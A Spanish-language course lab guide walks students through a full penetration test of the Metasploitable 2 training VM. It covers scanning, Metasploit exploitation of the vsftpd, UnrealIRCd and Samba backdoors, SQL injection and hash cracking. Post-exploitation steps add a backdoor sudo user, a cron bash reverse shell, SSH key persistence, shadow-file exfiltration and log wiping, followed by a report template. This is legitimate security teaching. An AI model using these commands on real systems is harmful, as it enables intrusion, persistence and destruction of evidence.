# Lab 8 — Proyecto Final: Pentest End-to-End

## Objetivo

Ejecutar un pentest profesional completo contra Metasploitable 2, aplicando todas las técnicas aprendidas durante el curso. El estudiante pasará por cada fase del ciclo de vida de un pentest real: reconocimiento, escaneo y enumeración, explotación de múltiples vectores, post-explotación, y entrega de un reporte profesional con hallazgos, evidencias y recomendaciones de remediación.

Al finalizar, el estudiante habrá demostrado capacidad para:
- Identificar servicios vulnerables en una red interna
- Explotar al menos tres vectores de ataque diferentes
- Escalar privilegios y mantener persistencia
- Documentar hallazgos con CVEs, scores CVSS y pasos de reproducción
- Redactar un reporte ejecutivo y técnico orientado al cliente

## Prerrequisitos

- Haber completado Labs 1–7
- Kali Linux 2024.x (VirtualBox o VMware) — mínimo 4 GB RAM, 40 GB disco
- Metasploitable 2 descargado e importado como VM separada
- Conocimiento básico de Metasploit Framework, nmap y enumeración de servicios

## Entorno

| Máquina     | SO                   | IP                                         | Rol      |
|-------------|----------------------|--------------------------------------------|----------|
| Atacante    | Kali Linux 2024.x    | 192.168.56.101                             | Pentest  |
| Objetivo    | Metasploitable 2     | 192.168.56.102 *(ajustar según entorno)*   | Víctima  |

- **Red**: Host-Only (`vboxnet0`) o NAT interno — el objetivo NO debe tener salida a Internet
- **Tiempo estimado**: 4–6 horas
- **Herramientas**: nmap, metasploit, enum4linux, nikto, dirb, smbclient, netdiscover, hydra, john — todas incluidas en Kali

```bash
# Verificar conectividad antes de comenzar
ping -c 3 192.168.56.102

# Guardar la IP como variable de entorno
export TARGET=192.168.56.102
echo "Objetivo: $TARGET"
```

---

## Fase 1: Reconocimiento

**Objetivo**: Identificar el objetivo en la red, sistemas operativos y primera impresión de la superficie de ataque.

### 1.1 Descubrimiento de Host

```bash
# Descubrir hosts activos en la subred
netdiscover -r 192.168.56.0/24 -i eth0

# Alternativa con nmap (más rápido)
nmap -sn 192.168.56.0/24 -oG hosts_activos.txt
grep "Up" hosts_activos.txt
```

**Output esperado**:
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.56.102
Host is up (0.00041s latency).
MAC Address: 08:00:27:XX:XX:XX (Oracle VirtualBox)
```

### 1.2 Escaneo de Puertos — Primera Pasada

```bash
# Escaneo rápido TCP SYN para descubrir puertos abiertos
nmap -sS -T4 -p- $TARGET -oN fase1_puertos.txt

# Ver resumen de puertos abiertos
grep "^[0-9]" fase1_puertos.txt
```

**Output esperado (extracto)**:
```
21/tcp    open   ftp
22/tcp    open   ssh
23/tcp    open   telnet
25/tcp    open   smtp
53/tcp    open   domain
80/tcp    open   http
111/tcp   open   rpcbind
139/tcp   open   netbios-ssn
445/tcp   open   microsoft-ds
512/tcp   open   exec
513/tcp   open   login
514/tcp   open   shell
1099/tcp  open   rmiregistry
1524/tcp  open   ingreslock
2049/tcp  open   nfs
2121/tcp  open   ccproxy-ftp
3306/tcp  open   mysql
5432/tcp  open   postgresql
5900/tcp  open   vnc
6000/tcp  open   X11
6667/tcp  open   irc
8009/tcp  open   ajp13
8180/tcp  open   unknown
```

> **Nota**: Metasploitable 2 expone intencionalmente docenas de servicios vulnerables. Esta superficie de ataque enorme es ideal para practicar múltiples vectores.

### 1.3 Detección de SO y Versiones

```bash
# Detección completa: OS, versiones de servicios, scripts por defecto
nmap -sS -sV -sC -O -p 21,22,23,25,80,139,445,3306,5432,6667,8180 $TARGET -oN fase1_servicios.txt

# Detección de OS solamente
nmap -O $TARGET | grep "OS details"
```

**Output esperado (extracto)**:
```
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
6667/tcp open  irc     UnrealIRCd
8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

OS details: Linux 2.6.9 - 2.6.33
```

**Entregable Fase 1**: Archivo `fase1_puertos.txt` con todos los puertos abiertos y versiones de servicio identificadas.

---

## Fase 2: Escaneo y Enumeración

**Objetivo**: Profundizar en cada servicio para identificar vulnerabilidades específicas, usuarios, recursos compartidos y rutas web.

### 2.1 Scripts de Vulnerabilidad con Nmap

```bash
# Ejecutar scripts NSE de vulnerabilidad
nmap --script vuln $TARGET -p 21,80,139,445,3306 -oN fase2_vulns.txt

# Scripts específicos por servicio
nmap --script ftp-vsftpd-backdoor $TARGET -p 21
nmap --script smb-vuln-ms08-067 $TARGET -p 445
nmap --script http-shellshock $TARGET -p 80
```

**Output esperado (vsftpd)**:
```
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     CVE: CVE-2011-2523
```

### 2.2 Enumeración SMB

```bash
# Enumeración completa de Samba
enum4linux -a $TARGET | tee fase2_smb.txt

# Ver recursos compartidos
smbclient -L //$TARGET -N

# Acceder a recurso tmp
smbclient //$TARGET/tmp -N
smb: \> ls
smb: \> exit
```

**Output esperado (enum4linux extracto)**:
```
[+] Got OS info for 192.168.56.102 from smbclient: 
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]

[+] Users on 192.168.56.102:
user:[msfadmin] rid:[1000]
user:[postgres] rid:[1001]
user:[service] rid:[1003]
user:[user] rid:[1004]
user:[www-data] rid:[33]

Share Enumeration:
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service
        ADMIN$          IPC       IPC Service
```

### 2.3 Enumeración Web — Puerto 80

```bash
# Escáner web completo con nikto
nikto -h http://$TARGET -o fase2_nikto.txt

# Enumeración de directorios
dirb http://$TARGET /usr/share/wordlists/dirb/common.txt -o fase2_dirb.txt

# Alternativa con gobuster (más rápido)
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o fase2_gobuster.txt
```

**Output esperado (nikto extracto)**:
```
+ Server: Apache/2.2.8 (Ubuntu) DAV/2
+ The anti-clickjacking X-Frame-Options header is not present.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /phpMyAdmin/: phpMyAdmin directory found
+ OSVDB-3268: /doc/: Directory indexing found.
+ /twiki/: A TWiki installation was found at this directory.
+ OSVDB-3233: /phpinfo.php: Contains PHP configuration information
```

**Output esperado (dirb extracto)**:
```
---- Scanning URL: http://192.168.56.102/ ----
==> DIRECTORY: http://192.168.56.102/dav/
==> DIRECTORY: http://192.168.56.102/dvwa/
==> DIRECTORY: http://192.168.56.102/mutillidae/
==> DIRECTORY: http://192.168.56.102/phpmyadmin/
==> DIRECTORY: http://192.168.56.102/tikiwiki/
+ http://192.168.56.102/phpinfo.php (CODE:200|SIZE:48168)
```

### 2.4 Enumeración de Base de Datos

```bash
# MySQL — probar credenciales por defecto
mysql -h $TARGET -u root -p
# Contraseña: (vacía — solo presionar Enter)

# Si accede:
mysql> show databases;
mysql> use dvwa;
mysql> show tables;
mysql> exit;
```

**Output esperado**:
```
Welcome to the MySQL monitor. Commands end with ; or \g.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
```

### 2.5 Enumeración de IRC (UnrealIRCd)

```bash
# Verificar versión de UnrealIRCd
nc -nv $TARGET 6667
# Escribir: VERSION
# Esperar respuesta y presionar Ctrl+C

# Con nmap script
nmap --script irc-info $TARGET -p 6667
```

**Output esperado**:
```
:irc.Metasploitable.LAN 351 * UnrealIRCd-3.2.8.1. irc.Metasploitable.LAN :FhinIoO
```

**Entregable Fase 2**: Archivos `fase2_smb.txt`, `fase2_nikto.txt`, `fase2_dirb.txt` con listado de usuarios, recursos compartidos, directorios web y versiones de servicios vulnerables.

---

## Fase 3: Explotación

**Objetivo**: Obtener acceso al sistema mediante al menos tres vectores de ataque diferentes.

> **Importante**: Documentar cada explotación con capturas de pantalla o salida de terminal guardada en archivo.

### 3.1 Vector 1 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)

**Descripción**: vsftpd 2.3.4 fue comprometido en su repositorio oficial en 2011. Cuando el usuario de FTP contiene `:)` (smiley), el daemon abre una shell de root en el puerto 6200.

**CVSS v3**: 9.8 (Crítico) | **CWE**: CWE-78 (OS Command Injection)

```bash
# Iniciar Metasploit
msfconsole -q

# Buscar el módulo
msf6> search vsftpd

# Seleccionar el exploit
msf6> use exploit/unix/ftp/vsftpd_234_backdoor

# Ver opciones requeridas
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> show options

# Configurar objetivo
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> set RHOSTS 192.168.56.102
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> set RPORT 21

# Ejecutar exploit
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> run
```

**Output esperado**:
```
[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.102:21 - USER: 331 Please specify the password.
[+] 192.168.56.102:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.101:35174 -> 192.168.56.102:6200)

id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
hostname
metasploitable
```

```bash
# Guardar evidencia
id > /tmp/vector1_evidencia.txt
cat /etc/passwd >> /tmp/vector1_evidencia.txt
```

### 3.2 Vector 2 — UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)

**Descripción**: UnrealIRCd 3.2.8.1 fue distribuido con una backdoor que permite ejecución de comandos arbitrarios enviando `AB` seguido del comando al puerto IRC.

**CVSS v2**: 7.5 (Alta) | **CWE**: CWE-78 (OS Command Injection)

```bash
# En msfconsole
msf6> search unrealircd

msf6> use exploit/unix/irc/unreal_ircd_3281_backdoor

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor)> show options

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor)> set RHOSTS 192.168.56.102
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor)> set RPORT 6667

# Configurar payload de reverse shell
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor)> set PAYLOAD cmd/unix/reverse

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor)> set LHOST 192.168.56.101
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor)> set LPORT 4444

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor)> run
```

**Output esperado**:
```
[*] Started reverse TCP double handler on 192.168.56.101:4444
[*] Connected to 192.168.56.102:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
[*] Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo PqOLBNomqzxXLuQB;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "PqOLBNomqzxXLuQB\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.56.101:4444 -> 192.168.56.102:32888)

id
uid=1001(ircd) gid=1001(ircd)
```

### 3.3 Vector 3 — Samba 3.0.20 "username map script" (CVE-2007-2447)

**Descripción**: Samba 3.0.0–3.0.25rc3 permite inyección de comandos en el campo de usuario MS-RPC cuando `username map script` está configurado. Produce shell de root directamente.

**CVSS v2**: 10.0 (Crítico) | **CWE**: CWE-20 (Improper Input Validation)

```bash
msf6> search samba usermap

msf6> use exploit/multi/samba/usermap_script

msf6 exploit(multi/samba/usermap_script)> set RHOSTS 192.168.56.102
msf6 exploit(multi/samba/usermap_script)> set LHOST 192.168.56.101
msf6 exploit(multi/samba/usermap_script)> set PAYLOAD cmd/unix/reverse

msf6 exploit(multi/samba/usermap_script)> run
```

**Output esperado**:
```
[*] Started reverse TCP double handler on 192.168.56.101:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo PqOLBNomqzxXLuQB;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Command shell session 3 opened (192.168.56.101:4444 -> 192.168.56.102:55674)

id
uid=0(root) gid=0(root)
```

### 3.4 Vector 4 (Bonus) — DVWA SQL Injection + File Upload

**Descripción**: DVWA (Damn Vulnerable Web Application) expone múltiples vulnerabilidades web. Utilizaremos SQLi para extraer credenciales y File Upload para subir una webshell.

**Pre-requisito**: Abrir `http://192.168.56.102/dvwa/` en el navegador, iniciar sesión con `admin/password`, ajustar el nivel de seguridad a "Low".

```bash
# 4a. Extracción de credenciales con SQLmap
sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=<tu_session_id>" \
       --dbs --batch

# Ver tablas de la base de datos dvwa
sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=<tu_session_id>" \
       -D dvwa --tables --batch

# Volcar tabla de usuarios
sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=<tu_session_id>" \
       -D dvwa -T users --dump --batch
```

**Output esperado**:
```
Database: dvwa
Table: users
[5 entries]
+---------+---------+----------------------------------+----------+
| user_id | user    | password                         | last_name|
+---------+---------+----------------------------------+----------+
| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin    |
| 2       | gordonb | e99a18c428cb38d5f260853678922e03 | Brown    |
| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me       |
| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso  |
| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith    |
+---------+---------+----------------------------------+----------+
```

```bash
# Crackear hashes MD5 con john
echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" > dvwa_hashes.txt
john dvwa_hashes.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
# Resultado: password => password
```

**Entregable Fase 3**: Para cada vector documentar: módulo MSF utilizado, opciones configuradas, output de `id`/`whoami`, captura de pantalla o archivo de log guardado.

---

## Fase 4: Post-Explotación

**Objetivo**: Desde el acceso obtenido, realizar escalada de privilegios, establecer persistencia, moverse lateralmente y simular exfiltración de datos.

> Trabajaremos desde la sesión obtenida en el Vector 1 (root) o Vector 2 (ircd). Hacer `background` de la sesión activa para seguir desde msfconsole.

### 4.1 Reconocimiento del Sistema Comprometido

```bash
# Desde shell en el objetivo
# Información del sistema
uname -a
cat /etc/issue
cat /proc/version

# Usuarios en el sistema
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/shadow

# Procesos en ejecución
ps aux

# Conexiones de red activas
netstat -tulpn

# Archivos SUID — potenciales vectores de escalada
find / -perm -4000 -type f 2>/dev/null
```

**Output esperado**:
```
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

# /etc/passwd (extracto)
root:x:0:0:root:/root:/bin/bash
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash

# Archivos SUID encontrados
/bin/ping
/sbin/mount.nfs
/usr/bin/nmap  <--- SUID en versión antigua = escalada a root
/usr/bin/sudo
```

### 4.2 Escalada de Privilegios (desde usuario no-root)

Si el acceso obtenido es de usuario limitado (ej: `ircd`), usar los siguientes métodos:

```bash
# Método 1: nmap interactivo (versión antigua con --interactive)
nmap --interactive
nmap> !sh
id
# uid=0(root)

# Método 2: Local Exploit Suggester en Metasploit
msf6> use post/multi/recon/local_exploit_suggester
msf6> set SESSION <id_sesion>
msf6> run

# Método 3: Exploit de kernel (si la versión es vulnerable)
# Linux 2.6.24 es vulnerable a varios exploits locales
searchsploit "linux kernel 2.6.24 local"
```

**Output esperado (local_exploit_suggester)**:
```
[*] 192.168.56.102 - Collecting local exploits for linux/x86...
[+] 192.168.56.102 - exploit/linux/local/udev_netlink: The target appears to be vulnerable.
[+] 192.168.56.102 - exploit/linux/local/sock_sendpage: The target appears to be vulnerable.
```

### 4.3 Actualizar Shell a Meterpreter

```bash
# Desde msfconsole, con sesión de shell abierta
msf6> sessions -l

# Actualizar shell a meterpreter
msf6> sessions -u <id_sesion_shell>

# O hacer upgrade manual
msf6> use post/multi/manage/shell_to_meterpreter
msf6> set SESSION <id>
msf6> run

# En la nueva sesión meterpreter
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getpid
```

### 4.4 Persistencia

```bash
# Método 1: Agregar usuario backdoor al sistema
meterpreter> shell
id
useradd -m -s /bin/bash -G sudo backd00r
echo "backd00r:P@ssw0rd123!" | chpasswd
echo "backd00r ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Verificar
grep backd00r /etc/passwd
grep backd00r /etc/sudoers

# Método 2: Cron job de reverse shell
meterpreter> shell
echo "* * * * * root bash -i >& /dev/tcp/192.168.56.101/9999 0>&1" >> /etc/crontab
crontab -l

# Método 3: Agregar clave SSH pública
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...tu_clave_publica..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Verificar acceso persistente
ssh -i ~/.ssh/id_rsa root@192.168.56.102
```

### 4.5 Exfiltración de Datos

```bash
# Exfiltrar archivos sensibles del objetivo
meterpreter> download /etc/passwd /tmp/exfil_passwd.txt
meterpreter> download /etc/shadow /tmp/exfil_shadow.txt

# Con shell — copiar archivos de configuración
meterpreter> shell
cat /etc/passwd
cat /etc/shadow
find /home -name "*.txt" -o -name "*.conf" 2>/dev/null
find /var/www -name "config.php" 2>/dev/null

# Leer configuración de MySQL (credenciales en texto claro)
cat /etc/mysql/my.cnf
cat /var/www/dvwa/config/config.inc.php
```

**Output esperado (config.inc.php)**:
```php
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = 'toor';
$_DVWA[ 'db_database' ] = 'dvwa';
```

### 4.6 Movimiento Lateral y Pivoting (Conceptual)

```bash
# Ver interfaces de red del objetivo (buscar otras subredes)
meterpreter> ipconfig
meterpreter> route

# Agregar ruta de pivoting en Metasploit
msf6> route add 10.0.0.0/24 <id_sesion>
msf6> route print

# Configurar proxy SOCKS para redirigir tráfico
msf6> use auxiliary/server/socks_proxy
msf6> set SRVPORT 1080
msf6> set VERSION 5
msf6> run -j

# Usar proxychains para alcanzar red interna
# Editar /etc/proxychains4.conf: agregar "socks5 127.0.0.1 1080"
proxychains nmap -sT -Pn -p 22,80,443 10.0.0.1
```

### 4.7 Borrado de Huellas

```bash
# Eliminar logs del sistema
meterpreter> clearev

# O manualmente desde shell
meterpreter> shell
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log
history -c
unset HISTFILE

# Eliminar archivos creados durante el pentest
rm -f /tmp/vector1_evidencia.txt
```

> **Nota pedagógica**: En un pentest real, el borrado de huellas requiere coordinación con el cliente. Los logs son evidencia forense valiosa para el equipo Blue Team. En este lab, documentar los comandos sin ejecutarlos en producción.

**Entregable Fase 4**: Log completo de comandos ejecutados con outputs, capturas de pantalla mostrando: escalada de privilegios, usuario persistente creado, archivos exfiltrados.

---

## Fase 5: Reporte Profesional

**Objetivo**: Documentar todos los hallazgos en un reporte ejecutivo y técnico siguiendo estándares de la industria (PTES, OWASP Testing Guide).

### 5.1 Estructura del Reporte

```markdown
# Informe de Prueba de Penetración
**Cliente**: [Nombre del cliente]
**Clasificación**: CONFIDENCIAL
**Fecha**: [Fecha de entrega]
**Versión**: 1.0
**Preparado por**: [Tu nombre]

---

## 1. Resumen Ejecutivo

### 1.1 Alcance
- **Sistema objetivo**: Metasploitable 2 (192.168.56.102)
- **Período de prueba**: [Fecha inicio] — [Fecha fin]
- **Metodología**: Caja negra / Caja gris
- **Herramientas**: Kali Linux, Metasploit Framework, nmap, enum4linux, nikto

### 1.2 Hallazgos Principales
Durante la evaluación se identificaron **X vulnerabilidades críticas**, 
**Y altas** y **Z medias**. El sistema objetivo fue completamente 
comprometido en múltiples vectores, incluyendo acceso root remoto sin 
autenticación. Se recomienda parcheo inmediato de los servicios expuestos
y segmentación de red.

### 1.3 Resumen de Riesgo
| Criticidad | Cantidad |
|------------|----------|
| Crítico    | 3        |
| Alto       | 2        |
| Medio      | 4        |
| Bajo       | 2        |

---

## 2. Hallazgos Técnicos

### Finding 1 — vsftpd 2.3.4 Backdoor

| Campo        | Detalle                                     |
|--------------|---------------------------------------------|
| **CVE**      | CVE-2011-2523                               |
| **CVSS v3**  | 9.8 (Crítico)                               |
| **Puerto**   | 21/tcp (FTP)                                |
| **Servicio** | vsftpd 2.3.4                                |
| **Impacto**  | Ejecución remota de código como root        |

**Descripción**: La versión 2.3.4 de vsftpd fue distribuida con una 
backdoor maliciosa. Al autenticarse con un usuario que contenga `:)`, 
el servidor abre una shell root en el puerto 6200.

**Pasos de reproducción**:
1. Conectar al puerto 21 de la víctima
2. Enviar usuario `cualquiera:)` con contraseña aleatoria
3. Conectar al puerto 6200 para obtener shell root

**Evidencia**:
```
uid=0(root) gid=0(root) groups=0(root)
```

**Remediación**:
- Actualizar vsftpd a versión 2.3.5 o superior (parcheada)
- Verificar integridad del binario con checksums
- Considerar reemplazar por OpenSSH o ProFTPD
- Deshabilitar FTP si no es necesario, usar SFTP

---

### Finding 2 — Samba 3.0.20 Username Map Script RCE

| Campo        | Detalle                                     |
|--------------|---------------------------------------------|
| **CVE**      | CVE-2007-2447                               |
| **CVSS v2**  | 10.0 (Crítico)                              |
| **Puerto**   | 139,445/tcp (SMB)                           |
| **Servicio** | Samba 3.0.20-Debian                         |
| **Impacto**  | Ejecución remota de código como root        |

**Descripción**: Samba versiones 3.0.0 a 3.0.25rc3 permiten inyección 
de comandos mediante el parámetro `username map script` en configuración 
MS-RPC. Sin autenticación, permite obtener shell root directamente.

**Pasos de reproducción**:
1. Usar MSF módulo `exploit/multi/samba/usermap_script`
2. Configurar RHOSTS y LHOST
3. Ejecutar exploit para obtener reverse shell root

**Remediación**:
- Actualizar Samba a 3.0.25 o superior
- Deshabilitar SMBv1
- Aplicar firewall para restringir acceso a puertos 139/445
- Revisar configuración de `smb.conf`

---

### Finding 3 — UnrealIRCd 3.2.8.1 Backdoor

| Campo        | Detalle                                     |
|--------------|---------------------------------------------|
| **CVE**      | CVE-2010-2075                               |
| **CVSS v2**  | 7.5 (Alta)                                  |
| **Puerto**   | 6667/tcp (IRC)                              |
| **Servicio** | UnrealIRCd 3.2.8.1                          |
| **Impacto**  | Ejecución remota de código como ircd        |

**Descripción**: Distribución oficial de UnrealIRCd 3.2.8.1 fue 
comprometida con backdoor que ejecuta comandos arbitrarios al recibir 
los caracteres `AB` en la conexión IRC.

**Remediación**:
- Actualizar a UnrealIRCd 3.2.9 o superior
- Verificar checksums SHA256 de todos los binarios críticos
- Deshabilitar IRC si no es servicio esencial

---

### Finding 4 — MySQL Credenciales por Defecto

| Campo        | Detalle                                     |
|--------------|---------------------------------------------|
| **CVE**      | N/A (configuración incorrecta)              |
| **CVSS v3**  | 9.8 (Crítico)                               |
| **Puerto**   | 3306/tcp (MySQL)                            |
| **Servicio** | MySQL 5.0.51a                               |
| **Impacto**  | Acceso completo a todas las bases de datos  |

**Descripción**: MySQL acepta conexiones remotas con usuario `root` 
y contraseña vacía. Permite acceso a todas las bases de datos, 
incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.

**Remediación**:
- Establecer contraseña fuerte para root de MySQL
- Deshabilitar acceso remoto de root (bind solo a localhost)
- Implementar principio de mínimo privilegio por base de datos

---

## 3. Matriz de Riesgo

| ID | Hallazgo                    | Criticidad | Probabilidad | Impacto | Prioridad |
|----|-----------------------------|-----------:|:------------:|:-------:|:---------:|
| F1 | vsftpd Backdoor             | Crítico    | Alta         | Total   | INMEDIATA |
| F2 | Samba RCE                   | Crítico    | Alta         | Total   | INMEDIATA |
| F3 | UnrealIRCd Backdoor         | Alta       | Alta         | Alto    | URGENTE   |
| F4 | MySQL sin contraseña        | Crítico    | Alta         | Total   | INMEDIATA |
| F5 | SQLi en DVWA                | Alto       | Alta         | Alto    | URGENTE   |

---

## 4. Recomendaciones Generales

1. **Actualización inmediata**: Parchear todos los servicios a versiones actuales
2. **Segmentación de red**: Aislar servicios sensibles en VLANs separadas
3. **Firewall**: Implementar reglas que permitan solo tráfico necesario
4. **Principio de mínimo privilegio**: Servicios no deben correr como root
5. **Monitoreo**: Implementar IDS/IPS y SIEM para detección de ataques
6. **Revisión de configuración**: Auditar todas las aplicaciones web instaladas

---

## 5. Anexos

### Anexo A — Herramientas Utilizadas
| Herramienta   | Versión | Propósito                            |
|---------------|---------|--------------------------------------|
| Kali Linux    | 2024.x  | Sistema operativo atacante           |
| nmap          | 7.94    | Escaneo de puertos y servicios       |
| Metasploit    | 6.x     | Framework de explotación             |
| enum4linux    | 0.9.1   | Enumeración SMB/Samba                |
| nikto         | 2.1.6   | Escáner web                          |
| sqlmap        | 1.7.x   | Explotación de SQL Injection         |

### Anexo B — Cronología del Ataque
| Hora  | Acción                           |
|-------|----------------------------------|
| 09:00 | Inicio de reconocimiento         |
| 09:30 | Identificación de servicios      |
| 10:00 | Enumeración SMB y web            |
| 10:45 | Explotación vsftpd (Vector 1)    |
| 11:15 | Explotación Samba (Vector 2)     |
| 11:45 | Explotación IRC (Vector 3)       |
| 12:30 | Post-explotación y persistencia  |
| 13:30 | Documentación y reporte          |
```

---

## Resultado Esperado

Al completar el lab, el estudiante debe haber obtenido y documentado:

1. **Shell root** en al menos dos vectores diferentes
2. **Archivo `/etc/shadow`** descargado (con hash de passwords)
3. **Credenciales de base de datos** extraídas desde archivos de configuración
4. **Usuario persistente** creado en el sistema objetivo
5. **Reporte técnico** con al menos 3 findings documentados con CVE y CVSS

### Flags para Capturar (Evidencia)

```bash
# Flag 1 — contenido de /etc/shadow (primeras 3 líneas)
head -3 /etc/shadow

# Flag 2 — ID del proceso de Metasploit activo
pgrep -a postgres

# Flag 3 — contenido del archivo de configuración de DVWA
cat /var/www/dvwa/config/config.inc.php | grep db_

# Flag 4 — usuario backdoor creado
grep backd00r /etc/passwd

# Flag 5 — versión exacta del kernel
uname -r
```

### Capturas de Pantalla Requeridas

- [ ] `screenshot_01_nmap_puertos.png` — Output completo de nmap con todos los puertos
- [ ] `screenshot_02_vector1_root.png` — Shell root vía vsftpd
- [ ] `screenshot_03_vector2_samba.png` — Shell root vía Samba
- [ ] `screenshot_04_vector3_irc.png` — Shell vía UnrealIRCd
- [ ] `screenshot_05_shadow.png` — Contenido de /etc/shadow exfiltrado
- [ ] `screenshot_06_persistencia.png` — Usuario backdoor en /etc/passwd

---

## Rúbrica de Evaluación

| Componente                        | Peso | Criterios de Evaluación                                                                                                  |
|-----------------------------------|-----:|--------------------------------------------------------------------------------------------------------------------------|
| **Laboratorio — Evidencia**       |  40% | Capturas de pantalla de cada vector explotado, archivos de log de msfconsole, flags capturados, usuario persistente documentado |
| **Reporte Escrito**               |  40% | Hallazgos con CVE y CVSS, pasos de reproducción claros, evidencias adjuntas, recomendaciones de remediación específicas  |
| **Examen Teórico (Quiz U8)**      |  20% | Preguntas sobre CVEs explotados, metodología PTES, diferencia entre escalada horizontal/vertical, conceptos de persistencia |

### Desglose del Laboratorio (40%)

| Sub-criterio                       | Puntos |
|------------------------------------|-------:|
| Reconocimiento completo (nmap + enum4linux) | 10 |
| Explotación Vector 1 (vsftpd)      | 20     |
| Explotación Vector 2 (Samba o IRC) | 20     |
| Explotación Vector 3 (web/SQLi)    | 15     |
| Post-explotación documentada       | 20     |
| Persistencia implementada          | 15     |
| **Total**                          | **100** |

### Desglose del Reporte (40%)

| Sub-criterio                         | Puntos |
|--------------------------------------|-------:|
| Resumen ejecutivo claro              | 15     |
| Findings con CVE, CVSS y descripción | 30     |
| Pasos de reproducción verificables   | 25     |
| Recomendaciones de remediación       | 20     |
| Presentación profesional             | 10     |
| **Total**                            | **100** |

---

## Estructura de Entregables

Crear la carpeta `proyecto_final/` con la siguiente estructura:

```
proyecto_final/
├── README.md               # Índice del proyecto
├── reconocimiento/
│   ├── fase1_puertos.txt
│   ├── fase1_servicios.txt
│   └── fase2_smb.txt
├── enumeracion/
│   ├── fase2_nikto.txt
│   ├── fase2_dirb.txt
│   └── fase2_mysql.txt
├── explotacion/
│   ├── vector1_vsftpd.log
│   ├── vector2_samba.log
│   ├── vector3_irc.log
│   └── vector4_sqli.log    (bonus)
├── post_explotacion/
│   ├── shadow_exfiltrado.txt
│   ├── persistencia.log
│   └── limpieza_huellas.md
├── evidencias/
│   ├── screenshot_01_nmap_puertos.png
│   ├── screenshot_02_vector1_root.png
│   ├── screenshot_03_vector2_samba.png
│   ├── screenshot_04_vector3_irc.png
│   ├── screenshot_05_shadow.png
│   └── screenshot_06_persistencia.png
└── reporte/
    ├── reporte_ejecutivo.pdf
    └── reporte_tecnico.md
```

---

## Recursos

### Documentación de Herramientas
- [Metasploit Framework Docs](https://docs.rapid7.com/metasploit/)
- [Nmap Book](https://nmap.org/book/man.html)
- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)

### CVEs Explotados en este Lab
- [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) — vsftpd 2.3.4 Backdoor
